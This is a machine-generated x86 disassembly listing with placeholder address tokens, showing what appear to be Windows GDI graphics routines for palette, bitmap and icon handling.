dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_403af4
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
movzx ebx [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
movzx ebx [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
movzx eax [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_42600c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_426060
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4030fc
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42615d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426164
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_426178
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4261fe
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_426210
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
add ecx ecx
add ecx ecx
call sub_4030fc
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_42600c
mov eax esp
call sub_426178
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_4262b4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_42600c
mov [ esp ] eax
sub_426308
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425ca8
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xe ]
call sub_425c88
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4264b5
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
add edx edx
add edx edx
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425b18
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4263db
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_425b28
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263e2
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_425a1c
sub_4263e2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425ca8
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425b18
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426495
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_425b28
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42649c
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_4264d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
movzx ecx [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
movzx ebx [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_426564
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_402ee8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_42685d
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_42664d
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_425a1c
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426654
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_426654
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_4264c8
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_402ee8
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_42683d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_426308
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_402ee8
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_42681a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
movzx eax [ ebp - 0x46 ]
push eax
movzx eax [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426821
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_402f1c
retn
call sub_425a70
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_4264c8
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_4264d4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_426888
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_4259f8
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_403af4
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425ca8
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
movzx eax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_42696c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_426888
movzx eax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
add eax eax
add eax eax
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
add eax eax
add eax eax
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_4269dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_426888
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426a79
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426a80
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_426ab4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_403af4
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_403af4
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_426aa8
xor edx edx
push ebp
push sub_426ca4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_42696c
push 0xffffffff
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_42696c
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_426c7d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_402ee8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_402ee8
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_402ee8
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_402ee8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_4269dc
mov eax [ ebp - 0x24 ]
push eax
push 0xffffffff
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_4269dc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
movzx edx [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
movzx edx [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
movzx edx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c84
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_402f1c
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_402f1c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_402f1c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_402f1c
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_426c84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cab
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_426cb4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_426d04
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_426d5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_426d04
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426da5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404528
mov edi eax
mov eax esi
call sub_404528
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426edf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426ec2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_409954
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ec9
mov al 0x1
sub_426f00
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41bbc8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426f48
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f4f
mov eax [ ebp - 0x4 ]
call sub_404650
retn
sub_426f54
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
movzx ebx [ ebp + 0x14 ]
push ebx
movzx ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_426f8c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41bbc8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426fd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426fde
mov eax [ ebp - 0x4 ]
call sub_404650
retn
sub_426fe8
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
pop esi
pop ebx
retn
sub_427020
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
